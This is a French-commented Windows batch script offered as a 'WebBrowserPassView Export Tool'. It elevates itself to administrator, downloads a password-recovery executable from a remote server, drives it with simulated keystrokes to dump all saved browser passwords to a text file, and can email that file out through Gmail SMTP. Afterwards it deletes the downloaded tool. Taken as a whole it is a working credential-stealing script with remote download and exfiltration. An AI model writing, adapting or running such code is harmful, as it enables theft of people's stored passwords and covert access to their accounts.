@echo off

rem Elevation en administrateur
net session >nul 2>&1
if %errorlevel% neq 0 (
  powershell -Command "Start-Process '%~f0' -Verb RunAs"
  exit /b
)

set "WBPV=%~dp0WebBrowserPassView.exe"
set "DOWNLOAD_URL=https://script.salutalex.fr/scripts/general/batch/WebBrowserPassView.exe"
set "EMAIL=REMOVED_SMTP_EMAIL"
set "DOWNLOADED=0"

rem Configuration email
set "SMTP_USER=REMOVED_SMTP_EMAIL"
set "SMTP_PASS=REMOVED_SMTP_PASS"

:MENU
cls
echo ========================================
echo    WebBrowserPassView - Export Tool
echo ========================================
echo.
echo 1. Enregistrement local uniquement
echo 2. Enregistrement et envoi par email
echo.
echo 0. Quitter
echo.
set /p choice="Choisissez une option (1, 2 ou 0): "

if "%choice%"=="1" goto EXPORT
if "%choice%"=="2" goto EXPORT_AND_SEND
if "%choice%"=="0" exit /b
goto MENU

:EXPORT
rem Telecharger si necessaire
if not exist "%WBPV%" (
  echo.
  echo Telechargement de WebBrowserPassView.exe...
  powershell -Command "try { Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%WBPV%' -UseBasicParsing; Write-Host 'Telechargement termine!' -ForegroundColor Green } catch { Write-Host 'Erreur:' $_.Exception.Message -ForegroundColor Red; exit 1 }"
  
  if %errorlevel% neq 0 (
    echo Erreur lors du telechargement.
    pause
    goto MENU
  )
  set "DOWNLOADED=1"
  timeout /t 1 /nobreak >nul
)

rem Generer un nom de fichier unique
call :GET_UNIQUE_FILENAME
set "OUTPUT=%UNIQUE_FILE%"

echo.
echo Lancement de WebBrowserPassView...
start "" "%WBPV%"

timeout /t 5 /nobreak >nul

echo Traitement en cours...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 5000; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1

timeout /t 3 /nobreak >nul

taskkill /F /IM WebBrowserPassView.exe >nul 2>&1

rem Attendre que le processus se termine completement
timeout /t 2 /nobreak >nul

rem Supprimer le fichier si telecharge
if "%DOWNLOADED%"=="1" (
  echo Nettoyage...
  del /F /Q "%WBPV%" >nul 2>&1
  if exist "%WBPV%" (
    powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
  )
)

if exist "%OUTPUT%" (
  echo Termine. Fichier sauvegarde: %OUTPUT%
  echo.
  echo Fermeture automatique dans 2 secondes...
  timeout /t 2 /nobreak >nul
  exit /b
) else (
  echo ERREUR: Le fichier n a pas ete cree.
  pause
  exit /b
)

:EXPORT_AND_SEND
rem Telecharger si necessaire
if not exist "%WBPV%" (
  echo.
  echo Telechargement de WebBrowserPassView.exe...
  powershell -Command "try { Invoke-WebRequest -Uri '%DOWNLOAD_URL%' -OutFile '%WBPV%' -UseBasicParsing; Write-Host 'Telechargement termine!' -ForegroundColor Green } catch { Write-Host 'Erreur:' $_.Exception.Message -ForegroundColor Red; exit 1 }"
  
  if %errorlevel% neq 0 (
    echo Erreur lors du telechargement.
    pause
    goto MENU
  )
  set "DOWNLOADED=1"
  timeout /t 1 /nobreak >nul
)

rem Generer un nom de fichier unique
call :GET_UNIQUE_FILENAME
set "OUTPUT=%UNIQUE_FILE%"

echo.
echo Lancement de WebBrowserPassView...
start "" "%WBPV%"

timeout /t 5 /nobreak >nul

echo Traitement en cours...
powershell -Command "$wsh = New-Object -ComObject WScript.Shell; $wsh.AppActivate('WebBrowserPassView'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^a'); Start-Sleep -Milliseconds 2000; $wsh.SendKeys('^s'); Start-Sleep -Milliseconds 5000; $wsh.SendKeys('%OUTPUT%{ENTER}')" >nul 2>&1

timeout /t 3 /nobreak >nul

taskkill /F /IM WebBrowserPassView.exe >nul 2>&1

rem Attendre que le processus se termine completement
timeout /t 2 /nobreak >nul

if not exist "%OUTPUT%" (
  echo ERREUR: Le fichier n a pas ete cree.
  rem Supprimer le fichier si telecharge
  if "%DOWNLOADED%"=="1" (
    del /F /Q "%WBPV%" >nul 2>&1
    if exist "%WBPV%" (
      powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
    )
  )
  pause
  goto MENU
)

echo Fichier sauvegarde: %OUTPUT%
echo.
echo Envoi du fichier par email...

powershell -Command ^
"$SMTPServer = 'smtp.gmail.com'; ^
$SMTPPort = 587; ^
$Username = '%SMTP_USER%'; ^
$Password = '%SMTP_PASS%'; ^
$EmailFrom = $Username; ^
$EmailTo = '%EMAIL%'; ^
$Subject = 'Export WebBrowserPassView - ' + (Get-Date -Format 'dd/MM/yyyy HH:mm'); ^
$Body = 'Export automatique des mots de passe du navigateur.'; ^
$FilePath = '%OUTPUT%'; ^
try { ^
    $SecurePassword = ConvertTo-SecureString $Password -AsPlainText -Force; ^
    $Credential = New-Object System.Management.Automation.PSCredential($Username, $SecurePassword); ^
    $MailMessage = @{ ^
        From = $EmailFrom; ^
        To = $EmailTo; ^
        Subject = $Subject; ^
        Body = $Body; ^
        SmtpServer = $SMTPServer; ^
        Port = $SMTPPort; ^
        UseSsl = $true; ^
        Credential = $Credential; ^
        Attachments = $FilePath ^
    }; ^
    Send-MailMessage @MailMessage; ^
    Write-Host 'Email envoye avec succes!' -ForegroundColor Green ^
} catch { ^
    Write-Host 'Erreur lors de l envoi:' $_.Exception.Message -ForegroundColor Red ^
}"

rem Supprimer le fichier si telecharge
if "%DOWNLOADED%"=="1" (
  echo.
  echo Nettoyage...
  del /F /Q "%WBPV%" >nul 2>&1
  if exist "%WBPV%" (
    powershell -Command "Remove-Item -Path '%WBPV%' -Force" >nul 2>&1
  )
)

echo.
echo Fermeture automatique dans 2 secondes...
timeout /t 2 /nobreak >nul
exit /b

:GET_UNIQUE_FILENAME
set "BASE=%~dp0passwords_export"
set "EXT=.txt"
set "COUNTER=0"
set "UNIQUE_FILE=%BASE%%EXT%"

:CHECK_FILE
if exist "%UNIQUE_FILE%" (
  set /a COUNTER+=1
  set "UNIQUE_FILE=%BASE%_%COUNTER%%EXT%"
  goto CHECK_FILE
)
goto :eof